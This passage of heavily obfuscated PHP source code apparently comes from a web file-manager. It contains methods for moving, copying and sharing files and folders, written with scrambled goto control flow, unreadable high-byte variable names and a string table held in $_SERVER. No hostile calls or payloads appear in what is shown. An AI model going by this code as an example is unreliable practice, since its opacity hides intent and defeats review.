$A·¦¬àÓ®¨, $DÒ‚Ø‹’¨Ÿ, $b·ªäÃÔŒÂ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($AªÀàÆù‰, $F”†Ô‘—ù, $EåöÚé¢™õ = REPEAT_REPLACE, $DãŒ±Ô = '') { goto D¼‹«áÄÈ»; eŞ«¬ˆÙ: return $b…¥™©óÃ´; goto dá³•‚ğ’; e Šˆ–¡²: if ($DÕåó„ìŠ[$f—½“Òç¸É[463]] == $F”†Ô‘—ù && $DãŒ±Ô != $DÕåó„ìŠ[$f—½“Òç¸É[28]]) { $f„óùùâá = $this->fileNameExist($F”†Ô‘—ù, $DãŒ±Ô); if ($f„óùùâá && $DÕåó„ìŠ[$f—½“Òç¸É[370]] == $f—½“Òç¸É[470]) { goto aÑŠš‹ç†•; aÑŠš‹ç†•: $dÈ®„¼…à² = $this->sourceInfo($f„óùùâá); $FñÙÈ–ƒˆã = $this->fileHistory($dÈ®„¼…à², $DÕåó„ìŠ[$f—½“Òç¸É[419]], $DÕåó„ìŠ[$f—½“Òç¸É[77]]); if (!$FñÙÈ–ƒˆã) { Model($f—½“Òç¸É[422])->remove($DÕåó„ìŠ[$f—½“Òç¸É[419]]); } goto A£‹ˆ­ÜíÆ; A£‹ˆ­ÜíÆ: $this->removeNow($AªÀàÆù‰, !1); $this->folderSizeReset($F”†Ô‘—ù); Hook::trigger($f—½“Òç¸É[534], $få’õøè‘§); goto c”ÀÓ‰õœ; c”ÀÓ‰õœ: return $f„óùùâá; goto DóÃ°³™©È; DóÃ°³™©È: } } $eÑ†â¾Ø = $DãŒ±Ô ? $DãŒ±Ô : $DÕåó„ìŠ[$f—½“Òç¸É[28]]; $this->lockMoveStart($AªÀàÆù‰); goto aœîÙ—İù; BĞ¼’Ğò›: $this->updateModifyTime($fóÈÎÁšÜ¥); Model($f—½“Òç¸É[507])->eventMove($AªÀàÆù‰, $DÕåó„ìŠ[$f—½“Òç¸É[463]], $F”†Ô‘—ù); Hook::trigger($f—½“Òç¸É[534], $få’õøè‘§); goto eŞ«¬ˆÙ; föïËóëâ: if ($DÕåó„ìŠ[$f—½“Òç¸É[370]] == $f—½“Òç¸É[83] && $Fğ›˜¸Ü´ì) { $this->folderSizeResetChildren($b…¥™©óÃ´); } Model($f—½“Òç¸É[167])->linkAdd($BÍ°¡ —â¨[$f—½“Òç¸É[503]]); if ($Fğ›˜¸Ü´ì && $BÍ°¡ —â¨[$f—½“Òç¸É[535]]) { $this->removeNow($AªÀàÆù‰, !1); } goto FÄØ÷ˆ¾‰î; aœîÙ—İù: $this->lockWriteStart($F”†Ô‘—ù, $eÑ†â¾Ø); $BÍ°¡ —â¨ = array($f—½“Òç¸É[503] => array(), $f—½“Òç¸É[535] => !1); $this->clearShare($AªÀàÆù‰, $F”†Ô‘—ù); goto dÁƒĞÌÄ‹±; D¼‹«áÄÈ»: $f—½“Òç¸É =& $_SERVER[“]; $DÕåó„ìŠ = $this->sourceInfo($AªÀàÆù‰); $d¬ŒòÅà£Ş = $this->sourceInfo($F”†Ô‘—ù); goto b¼°¤‚×; b¼°¤‚×: if ($DÕåó„ìŠ[$f—½“Òç¸É[463]] == $d¬ŒòÅà£Ş[$f—½“Òç¸É[369]]) { if ($DÕåó„ìŠ[$f—½“Òç¸É[397]] == $f—½“Òç¸É[83]) { Model($f—½“Òç¸É[395])->restore(array($AªÀàÆù‰)); } return $AªÀàÆù‰; } $få’õøè‘§ = $this->pathInfoMore($AªÀàÆù‰); if ($this->isParentOf($AªÀàÆù‰, $F”†Ô‘—ù)) { return !1; } goto bèè§¯×³ä; bèè§¯×³ä: if (!$DÕåó„ìŠ || !$d¬ŒòÅà£Ş || $d¬ŒòÅà£Ş[$f—½“Òç¸É[370]] != $f—½“Òç¸É[83]) { return !1; } Hook::trigger($f—½“Òç¸É[533], $få’õøè‘§); $this->targetIsDelete = intval($DÕåó„ìŠ[$f—½“Òç¸É[397]]); goto e Šˆ–¡²; FƒŠ¢³ÛÂ: $this->folderSizeReset($F”†Ô‘—ù); $fóÈÎÁšÜ¥ = array($DÕåó„ìŠ[$f—½“Òç¸É[463]], $F”†Ô‘—ù); if ($DÕåó„ìŠ[$f—½“Òç¸É[370]] == $f—½“Òç¸É[83]) { $fóÈÎÁšÜ¥[] = $AªÀàÆù‰; } goto BĞ¼’Ğò›; dÁƒĞÌÄ‹±: $Fğ›˜¸Ü´ì = $this->fileNameExistCache($F”†Ô‘—ù, $DÕåó„ìŠ[$f—½“Òç¸É[28]]); $b…¥™©óÃ´ = $this->_move($AªÀàÆù‰, $F”†Ô‘—ù, $EåöÚé¢™õ, $BÍ°¡ —â¨, $DãŒ±Ô); $this->sourceCacheClear(); goto föïËóëâ; FÄØ÷ˆ¾‰î: $this->lockMoveEnd($AªÀàÆù‰); $this->lockWriteEnd($F”†Ô‘—ù, $eÑ†â¾Ø); $this->folderSizeReset($DÕåó„ìŠ[$f—½“Òç¸É[463]]); goto FƒŠ¢³ÛÂ; dá³•‚ğ’: } private function _move($E³†õƒÍ‡, $dçœ¨õÛ¹Ô, $c‚¯õéÉ–î, &$BÚ…Ùøé, $EĞ‡†ÀŠñ = '') { goto d¤ö‰‡Šíµ; A´ôàä¯Ò: return $f¸§šëŠğ; goto Cã…õ¸Ñ¤ï; d¤ö‰‡Šíµ: $bä»ĞÈ»ö =& $_SERVER[“]; $c¶‡ÖÓöÔÄ = $this->sourceInfo($E³†õƒÍ‡); $FÇ–£§—Œ­ = $c¶‡ÖÓöÔÄ[$bä»ĞÈ»ö[370]] == $bä»ĞÈ»ö[83]; goto béé£›¸ÚØ; aÜ‚©ÊÕ”: $a·ÄŒ¿½³ = !1; if ($FÇ–£§—Œ­) { if ($c‚¯õéÉ–î == REPEAT_RENAME_FOLDER) { $Cñ”æ«ê‰‚ = $this->fileNameAuto($dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚, $c‚¯õéÉ–î, $FÇ–£§—Œ­); $f¸§šëŠğ = $this->_moveForce($E³†õƒÍ‡, $dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚); } else { if ($c‚¯õéÉ–î == REPEAT_RENAME_FOLDER) { $c‚¯õéÉ–î = REPEAT_RENAME; } $DŒù•è›¨õ = $this->_childrenListSelect($E³†õƒÍ‡); foreach ($DŒù•è›¨õ as $c‰†ÙÍ¼Ú¥) { $this->_move($c‰†ÙÍ¼Ú¥[$bä»ĞÈ»ö[369]], $A°¾ƒÇ¤, $c‚¯õéÉ–î, $BÚ…Ùøé); } $a·ÄŒ¿½³ = !0; } } else { if ($c‚¯õéÉ–î == REPEAT_SKIP) { $a·ÄŒ¿½³ = !0; } else { if ($c‚¯õéÉ–î == REPEAT_RENAME || $c‚¯õéÉ–î == REPEAT_RENAME_FOLDER) { $Cñ”æ«ê‰‚ = $this->fileNameAuto($dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚, $c‚¯õéÉ–î, $FÇ–£§—Œ­); $f¸§šëŠğ = $this->_moveForce($E³†õƒÍ‡, $dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚); } else { if ($c‚¯õéÉ–î == REPEAT_REPLACE) { $eÔ„—Şä = $this->sourceInfoCache($A°¾ƒÇ¤); $AÀƒàáìŠÅ = $this->fileHistory($eÔ„—Şä, $c¶‡ÖÓöÔÄ[$bä»ĞÈ»ö[419]], $c¶‡ÖÓöÔÄ[$bä»ĞÈ»ö[77]]); if ($AÀƒàáìŠÅ) { $BÚ…Ùøé[$bä»ĞÈ»ö[503]][] = $c¶‡ÖÓöÔÄ[$bä»ĞÈ»ö[419]]; } else { $a·ÄŒ¿½³ = !0; } } } } } if ($a·ÄŒ¿½³ && !$BÚ…Ùøé[$bä»ĞÈ»ö[535]]) { $BÚ…Ùøé[$bä»ĞÈ»ö[535]] = !0; } goto A´ôàä¯Ò; AÎªÄŞêº‡: $this->lockWriteStart($dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚); if (!$A°¾ƒÇ¤) { return $this->_moveForce($E³†õƒÍ‡, $dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚); } $f¸§šëŠğ = $A°¾ƒÇ¤; goto aÜ‚©ÊÕ”; béé£›¸ÚØ: $Cñ”æ«ê‰‚ = $EĞ‡†ÀŠñ ? $EĞ‡†ÀŠñ : $c¶‡ÖÓöÔÄ[$bä»ĞÈ»ö[28]]; $A°¾ƒÇ¤ = $this->fileNameExistCache($dçœ¨õÛ¹Ô, $Cñ”æ«ê‰‚); $this->lockMoveStart($E³†õƒÍ‡); goto AÎªÄŞêº‡; Cã…õ¸Ñ¤ï: } private function _moveForce($D‘áÃä²ÍŠ, $bè½Üï‹½‘, $C«„ÈÕ˜¡Î) { goto DáìñÂÒÛØ; DáìñÂÒÛØ: $FÒÔøÍÁ³¨ =& $_SERVER[“]; $AÁëÈÔ³ªò = $this->sourceInfo($D‘áÃä²ÍŠ); $F×¢®×¹˜ = $this->sourceInfo($bè½Üï‹½‘); goto Fã†šñ¤…; Fã†šñ¤…: $f«—ÛÁœ†Š = $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[370]] == $FÒÔøÍÁ³¨[83]; $FøŠñÖŞõ˜ = array($FÒÔøÍÁ³¨[368] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[369]], $FÒÔøÍÁ³¨[527] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[461]] . $F×¢®×¹˜[$FÒÔøÍÁ³¨[369]] . $FÒÔøÍÁ³¨[47], $FÒÔøÍÁ³¨[523] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[371]], $FÒÔøÍÁ³¨[524] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[458]], $FÒÔøÍÁ³¨[526] => USER_ID, $FÒÔøÍÁ³¨[386] => $C«„ÈÕ˜¡Î); $f‹à÷“Ûº = $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[371]] == SourceModel::TYPE_GROUP && $F×¢®×¹˜[$FÒÔøÍÁ³¨[371]] == SourceModel::TYPE_GROUP && $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[458]] == $F×¢®×¹˜[$FÒÔøÍÁ³¨[458]]; goto AÉŞ‘±š•İ; AÉŞ‘±š•İ: if (!$f‹à÷“Ûº) { Model($FÒÔøÍÁ³¨[456])->authClear($D‘áÃä²ÍŠ); } $eÖØ²‹õ· = $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[397]] == $FÒÔøÍÁ³¨[83] && $F×¢®×¹˜[$FÒÔøÍÁ³¨[397]] != $FÒÔøÍÁ³¨[83]; if ($eÖØ²‹õ·) { $FøŠñÖŞõ˜[$FÒÔøÍÁ³¨[396]] = 0; } goto aÛÔØæÀÅ÷; aÛÔØæÀÅ÷: if ($f«—ÛÁœ†Š) { $F™„³™î = array($FÒÔøÍÁ³¨[527] => array($FÒÔøÍÁ³¨[485], $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[461]] . $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[369]] . $FÒÔøÍÁ³¨[486])); $E…ãİ’•­° = $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[461]] . $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[369]] . $FÒÔøÍÁ³¨[47]; $C’Ş¶Æ¬âõ = $F×¢®×¹˜[$FÒÔøÍÁ³¨[461]] . $F×¢®×¹˜[$FÒÔøÍÁ³¨[369]] . $FÒÔøÍÁ³¨[47] . $AÁëÈÔ³ªò[$FÒÔøÍÁ³¨[369]] . $FÒÔøÍÁ³¨[47]; $cõâ†ê²øª = array($FÒÔøÍÁ³¨[527] => array($FÒÔøÍÁ³¨[536], "\162\145\160\154\x61\143\145\x28\x70\x61\162\145\156\164\114\x65\x76\145\154\54\47{$E…ãİ’•­°}\x27\x2c\47{$C’Ş¶Æ¬âõ}\47\51"), $FÒÔøÍÁ³¨[523] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[371]], $FÒÔøÍÁ³¨[524] => $F×¢®×¹˜[$FÒÔøÍÁ³¨[458]]); if ($eÖØ²‹õ·) { $cõâ†ê²øª[$FÒÔøÍÁ³¨[396]] = 0; } $this->where($F™„³™î)->data($cõâ†ê²øª)->save(); } $this->where(array($FÒÔøÍÁ³¨[383] => $D‘áÃä²ÍŠ))->data($FøŠñÖŞõ˜)->save(); return $D‘áÃä²ÍŠ; goto D³Äò† ‚ƒ; D³Äò† ‚ƒ: } private function clearShare($cŠ‚î ëÅÇ, $a”µ°µàã®) { goto A•áÓã†ÙÔ; dÈ’ãŒ‹¹Ø: if ($D¤ ïØ†™Ù[$aÔ×ìâŞéç[458]] == $DƒˆÂÛùÒ°[$aÔ×ìâŞéç[458]] && $D¤ ïØ†™Ù[$aÔ×ìâŞéç[371]] == $aÔ×ìâŞéç[537]) { return; } $bò·•µ¶Ô¦ = array($aÔ×ìâŞéç[461] => array($aÔ×ìâŞéç[485], $D¤ ïØ†™Ù[$aÔ×ìâŞéç[461]] . $cŠ‚î ëÅÇ . $aÔ×ìâŞéç[486])); $A‘£ÛÑÊŠ® = $this->field($aÔ×ìâŞéç[383])->where($bò·•µ¶Ô¦)->getField($aÔ×ìâŞéç[369], !0); goto e¿à²Ûéìä; A•áÓã†ÙÔ: $aÔ×ìâŞéç =& $_SERVER[“]; $D¤ ïØ†™Ù = $this->sourceInfo($cŠ‚î ëÅÇ); $DƒˆÂÛùÒ° = $this->sourceInfo($a”µ°µàã®); goto dÈ’ãŒ‹¹Ø; eÔ¹ÆŞŞÌ: Model($aÔ×ìâŞéç[538])->where($bò·•µ¶Ô¦)->save(array($aÔ×ìâŞéç[448] => 0)); Model($aÔ×ìâŞéç[539])->where($bò·•µ¶Ô¦)->delete(); goto FØù™¶¼À‚; fĞ›Şœ±íİ: if (!$e‰ÁéØë¦) { return; } $e‰ÁéØë¦ = array_to_keyvalue($e‰ÁéØë¦, $aÔ×ìâŞéç[33], $aÔ×ìâŞéç[441]); $bò·•µ¶Ô¦ = array($aÔ×ìâŞéç[441] => array($aÔ×ìâŞéç[7], $e‰ÁéØë¦)); goto eÔ¹ÆŞŞÌ; e¿à²Ûéìä: if (!$A‘£ÛÑÊŠ®) { return; } $bò·•µ¶Ô¦ = array($aÔ×ìâŞéç[369] => array($aÔ×ìâŞéç[7], $A‘£ÛÑÊŠ®), $aÔ×ìâŞéç[448] => 1); $e‰ÁéØë¦ = Model($aÔ×ìâŞéç[538])->field($aÔ×ìâŞéç[441])->where($bò·•µ¶Ô¦)->select(); goto fĞ›Şœ±íİ; FØù™¶¼À‚: } public function copyFolderFromIO($båÆ‡¶™ªÓ, $aÁ“˜¿İ¡, $cÇ¡‚ª†Â, $B¬Í¿§…í‚, $BÀµÖª»‘Š, $FŒ¸ÏÜÊš” = false) { goto Fùì¸ÅÁ•Ï; AçÒ‰øÏÁØ: $this->updateModifyTime($cÇ¡‚ª†Â); return $E’¦­ãÂ¯‹; goto b”š™®Š¢; FòÎ¡Á‹½È: Hook::trigger($Dœ‡§Òë¢²[542]); if ($E’¦­ãÂ¯‹) { $this->folderSizeResetChildren($E’¦­ãÂ¯‹); } $this->_childrenListClear(); goto C°Èî¶‘ôã; d«¸éã¼œ™: $a¼êÉ©Ê›× = $this->fileNameExist($cÇ¡‚ª†Â, $dª‡˜Òù†); $E’¦­ãÂ¯‹ = $this->mkdir($cÇ¡‚ª†Â, $dª‡˜Òù†, $B¬Í¿§…í‚); if (!$a¼êÉ©Ê›× || $B¬Í¿§…í‚ == REPEAT_RENAME_FOLDER) { $B¬Í¿§…í‚ = !1; } goto dÃ“­ÍÓí‚; còŸ†¨²Òî: Model($Dœ‡§Òë¢²[422])->linkAdd($eùØÜò¿Ó[$Dœ‡§Òë¢²[503]]); Model($Dœ‡§Òë¢²[422])->remove($eùØÜò¿Ó[$Dœ‡§Òë¢²[540]]); $this->folderSizeReset($cÇ¡‚ª†Â); goto AçÒ‰øÏÁØ; dÃ“­ÍÓí‚: if ($a¼êÉ©Ê›×) { $this->_childrenAllMake($a¼êÉ©Ê›×); } Hook::trigger($Dœ‡§Òë¢²[541]); $this->_copyChildTo($båÆ‡¶™ªÓ, $aÁ“˜¿İ¡, $E’¦­ãÂ¯‹, $B¬Í¿§…í‚, $eùØÜò¿Ó, $BÀµÖª»‘Š); goto FòÎ¡Á‹½È; Fùì¸ÅÁ•Ï: $Dœ‡§Òë¢² =& $_SERVER[“]; $eùØÜò¿Ó = array($Dœ‡§Òë¢²[504] => array(), $Dœ‡§Òë¢²[505] => array(), $Dœ‡§Òë¢²[503] => array(), $Dœ‡§Òë¢²[540] => array()); $dª‡˜Òù† = $FŒ¸ÏÜÊš” ? $FŒ¸ÏÜÊš” : $båÆ‡¶™ªÓ->getPathName($båÆ‡¶™ªÓ->pathThis($aÁ“˜¿İ¡)); goto d«¸éã¼œ™; C°Èî¶‘ôã: Model($Dœ‡§Òë¢²[506])->addAll($eùØÜò¿Ó[$Dœ‡§Òë¢²[504]], array(), !0); Model($Dœ‡§Òë¢²[507])->eventCopy($E’¦­ãÂ¯‹); $this->saveAll($eùØÜò¿Ó[$Dœ‡§Òë¢²[505]]); goto còŸ†¨²Òî; b”š™®Š¢: } private function _copyChildTo($a™»µ÷ƒÉÕ, $F£¼¸ÒáÑ², $dŸ¥ñ§ô, $DÃ•“Á‚ïŸ, &$bÊª¦º“İñ, $EÌ‰æîÕ¤ô) { goto Fš¤‘ØÃœ; cùŠØÚáÊâ: $bš¢÷í = $this->_childrenList($dŸ¥ñ§ô); $bš¢÷í = array_to_keyvalue($bš¢÷í, $AöÎóØ„Ÿ[28]); foreach ($eÏ²Äôôä‘ as $Fç¬³ÑØ˜ñ) { $EŒ¨¢±È—© = $bš¢÷í[$Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]]]; $FóŒ®¯á³ = $EŒ¨¢±È—©[$AöÎóØ„Ÿ[369]]; $this->_copyApplyMeta($EŒ¨¢±È—©, $bÊª¦º“İñ); if ($Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[29]] == $AöÎóØ„Ÿ[76]) { $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[75]] = $a™»µ÷ƒÉÕ->getPathInner($Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[75]]); $this->_copyChildTo($a™»µ÷ƒÉÕ, $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[75]], $FóŒ®¯á³, $DÃ•“Á‚ïŸ, $bÊª¦º“İñ, $EÌ‰æîÕ¤ô); } } goto A‹¿ƒÜàÙ; e„µ®¦—™‚: $eÏ²Äôôä‘ = array_merge($dù™æ²£­Ô[$AöÎóØ„Ÿ[73]], $dù™æ²£­Ô[$AöÎóØ„Ÿ[74]]); $fˆøÆË Ü = $this->_addFiles($a™»µ÷ƒÉÕ, $dù™æ²£­Ô[$AöÎóØ„Ÿ[73]], $EÌ‰æîÕ¤ô); $CË¤¹ÌçÇ” = array(); goto cÄ¤Œ¼¦”; cÄ¤Œ¼¦”: foreach ($eÏ²Äôôä‘ as &$Fç¬³ÑØ˜ñ) { goto EÑôôñ¥; e„¹èÉÖÕ: $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[77]] = _get($Fç¬³ÑØ˜ñ, $AöÎóØ„Ÿ[77], 0); $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]] = _get($Fç¬³ÑØ˜ñ, $AöÎóØ„Ÿ[419], 0); if (!isset($Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[543]]) && $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]]) { $bÊª¦º“İñ[$AöÎóØ„Ÿ[540]][] = $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]]; } goto EË×ˆ¢¾; EÑôôñ¥: if (isset($fˆøÆË Ü[$Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]]])) { $Fç¬³ÑØ˜ñ = $fˆøÆË Ü[$Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]]]; } $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[370]] = $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[29]] == $AöÎóØ„Ÿ[76]; $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[372]] = _get($Fç¬³ÑØ˜ñ, $AöÎóØ„Ÿ[160], $AöÎóØ„Ÿ[33]); goto e„¹èÉÖÕ; EË×ˆ¢¾: if ($DÃ•“Á‚ïŸ) { $cÊÂÙ‚®Æ = $this->fileNameExistCache($dŸ¥ñ§ô, $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]]); if ($cÊÂÙ‚®Æ) { if ($Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[370]] || $DÃ•“Á‚ïŸ == REPEAT_SKIP) { continue; } if ($DÃ•“Á‚ïŸ == REPEAT_REPLACE) { $EŒ¨¢±È—© = $this->sourceInfoCache($cÊÂÙ‚®Æ); $F•±Š‡£Ş = $this->fileHistory($EŒ¨¢±È—©, $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]], $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[77]]); if ($F•±Š‡£Ş) { $bÊª¦º“İñ[$AöÎóØ„Ÿ[503]][] = $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]]; } continue; } else { if ($DÃ•“Á‚ïŸ == REPEAT_RENAME) { $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]] = $this->fileNameAutoCache($dŸ¥ñ§ô, $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]], $DÃ•“Á‚ïŸ, !1); } } } } if (!$Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[370]] && $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]]) { $bÊª¦º“İñ[$AöÎóØ„Ÿ[503]][] = $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[419]]; } $CË¤¹ÌçÇ”[] = $this->_makeItemData($Fç¬³ÑØ˜ñ, $C§’ Ğå¾, $Fç¬³ÑØ˜ñ[$AöÎóØ„Ÿ[28]]); goto e…åÍÃ‹å¬; e…åÍÃ‹å¬: } unset($Fç¬³ÑØ˜ñ); if (!empty($CË¤¹ÌçÇ”)) { $this->addAll($CË¤¹ÌçÇ”); } goto cùŠØÚáÊâ; Fš¤‘ØÃœ: $AöÎóØ„Ÿ =& $_SERVER[“]; $C§’ Ğå¾ = $this->sourceInfoCache($dŸ¥ñ§ô); $dù™æ²£­Ô = $a™»µ÷ƒÉÕ->listPath($F£¼¸ÒáÑ², !1, !0); goto e„µ®¦—™‚; A‹¿ƒÜàÙ: } private function _addFiles($FÉîÈæ”†, $C”ØÏå¸ãª, $E¼ƒ×ƒÒ×Ç) { goto EõƒĞ‡ÃÛ©; eƒÊßõ§Ï: $dÏÇ‚‰¢ê³ = array(); foreach ($C”ØÏå¸ãª as $e‘„ÄÜ×¼) { if (isset($e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[543]]) && $e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[543]]) { continue; } $cÖ…ÍÅÈã• = $FÉîÈæ”†->getPathInner($e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[75]]); $b¸µôÙİã = $bÁ‘ŒĞ->addFileMake($cÖ…ÍÅÈã•, $e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[77]], $e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[164]], $e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[163]], $e‘„ÄÜ×¼[$EãÖ¶œÓíÛ[28]], $E¼ƒ×ƒÒ×Ç); $dÏÇ‚‰¢ê³[] = $b¸µôÙİã; } $bÁ‘ŒĞ->addAll($dÏÇ‚‰¢ê³); goto AÛ‹×¨Ïßñ; c˜àª…¸ïğ: $eÏğšŠõá‹ = $bÁ‘ŒĞ->where($D„ÊÙí‰°‹)->select(); $eÏğšŠõá‹ = $eÏğšŠõá‹ ? $eÏğšŠõá‹ : array(); foreach ($eÏğšŠõá‹ as $D¸ÛË†Ï¡) { if (!isset($Eœ¤á™áæ[$D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[163]]])) { continue; } $Bœ·™İí¶• = $Eœ¤á™áæ[$D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[163]]]; foreach ($Bœ·™İí¶• as &$fæ¼Ì¥£–†) { $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[419]] = $D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[419]]; $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[543]] = !0; } unset($fæ¼Ì¥£–†); } goto eƒÊßõ§Ï; a‘©ÎÄ¸§: foreach ($eÏğšŠõá‹ as $D¸ÛË†Ï¡) { if (!isset($Eœ¤á™áæ[$D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[163]]])) { continue; } $DìØß¦ÉÕî =& $Eœ¤á™áæ[$D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[163]]]; foreach ($DìØß¦ÉÕî as &$fæ¼Ì¥£–†) { $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[419]] = $D¸ÛË†Ï¡[$EãÖ¶œÓíÛ[419]]; } unset($fæ¼Ì¥£–†); } $Fˆ¿­Œ…ï‚ = array(); foreach ($C”ØÏå¸ãª as $b¹Úâƒ) { $Fˆ¿­Œ…ï‚[$b¹Úâƒ[$EãÖ¶œÓíÛ[28]]] = $b¹Úâƒ; } goto E¤®Úâß¾; E¤®Úâß¾: return $Fˆ¿­Œ…ï‚; goto cööÈ ÅŠ±; EõƒĞ‡ÃÛ©: $EãÖ¶œÓíÛ =& $_SERVER[“]; if (!$C”ØÏå¸ãª || count($C”ØÏå¸ãª) == 0) { return array(); } $Eœ¤á™áæ = array(); goto AîÅ÷éøÑŸ; AÛ‹×¨Ïßñ: $D„ÊÙí‰°‹ = array($EãÖ¶œÓíÛ[163] => array($EãÖ¶œÓíÛ[7], array_keys($Eœ¤á™áæ))); $eÏğšŠõá‹ = $bÁ‘ŒĞ->where($D„ÊÙí‰°‹)->select(); $eÏğšŠõá‹ = $eÏğšŠõá‹ ? $eÏğšŠõá‹ : array(); goto a‘©ÎÄ¸§; AîÅ÷éøÑŸ: foreach ($C”ØÏå¸ãª as &$fæ¼Ì¥£–†) { goto FéØçÑ‹µ; EÏæ´ŒÕÓ: $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[163]] = $Fóø¡©¹¡ù; Hook::trigger($EãÖ¶œÓíÛ[545], $fæ¼Ì¥£–†); $Eœ¤á™áæ[$Fóø¡©¹¡ù][] =& $fæ¼Ì¥£–†; goto båëõõ†ÍÏ; FéØçÑ‹µ: Hook::trigger($EãÖ¶œÓíÛ[544], $fæ¼Ì¥£–†); $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[75]] = $FÉîÈæ”†->getPathInner($fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[75]]); $FêŒÄÃÁ‘œ = $FÉîÈæ”†->hashSimple($fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[75]]); goto D¹¶§­±å´; D¹¶§­±å´: $Fóø¡©¹¡ù = $FÉîÈæ”†->hashMd5($fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[75]]); if (strlen($Fóø¡©¹¡ù) > 10 && !isset($Eœ¤á™áæ[$Fóø¡©¹¡ù])) { $Eœ¤á™áæ[$Fóø¡©¹¡ù] = array(); } $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[164]] = $FêŒÄÃÁ‘œ; goto EÏæ´ŒÕÓ; båëõõ†ÍÏ: if (count($Eœ¤á™áæ[$Fóø¡©¹¡ù]) > 1) { $fæ¼Ì¥£–†[$EãÖ¶œÓíÛ[543]] = !0; } goto b¼¦ºÏÀ‚¸; b¼¦ºÏÀ‚¸: } $D„ÊÙí‰°‹ = array($EãÖ¶œÓíÛ[163] => array($EãÖ¶œÓíÛ[7], array_keys($Eœ¤á™áæ))); $bÁ‘ŒĞ = Model($EãÖ¶œÓíÛ[546]); goto c˜àª…¸ïğ; cööÈ ÅŠ±: } } define($_SERVER[“][547], $_SERVER[“][548]); goto fµ“Í¶·¯‡; d™‚õ©âÑ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($d³¸‰„ Ê±) { $this->pathParse = $d³¸‰„ Ê±; $this->model = Model($_SERVER[“][1104]); } protected function infoParse($D¯øù³÷…, $B—µÀœª¯’ = false, $B‡ß…Ï›“ = false) { $Eæ»ÅË‚¡ï =& $_SERVER[“]; return Action($Eæ»ÅË‚¡ï[1005])->sharePathInfo($this->pathParse[$Eæ»ÅË‚¡ï[75]], !0); } public function listPath($Fèšî¤ÖÚ¤, $B¿²—ŞÓì† = false) { $EìèƒìÈ =& $_SERVER[“]; $d®Œ¦ÑÑÆ = parent::listPath($Fèšî¤ÖÚ¤, $B¿²—ŞÓì†); foreach ($d®Œ¦ÑÑÆ as $eƒø¦¸„Ò© => $dæ±÷Æá„) { if (!in_array($eƒø¦¸„Ò©, array($EìèƒìÈ[73], $EìèƒìÈ[74]))) { continue; } foreach ($dæ±÷Æá„ as $F³¨Œñ => $F×æ¼ØöÈ‹) { $d®Œ¦ÑÑÆ[$eƒø¦¸„Ò©][$F³¨Œñ] = Action($EìèƒìÈ[1005])->shareItemInfo($F×æ¼ØöÈ‹); } } return $d®Œ¦ÑÑÆ; } public function listAll($CÀÂ•ˆ«ÛÑ) { $DõŸ‡ƒì¸Û =& $_SERVER[“]; $F’£•õÎ¾Ğ = IO::info($this->pathParse[$DõŸ‡ƒì¸Û[75]]); if 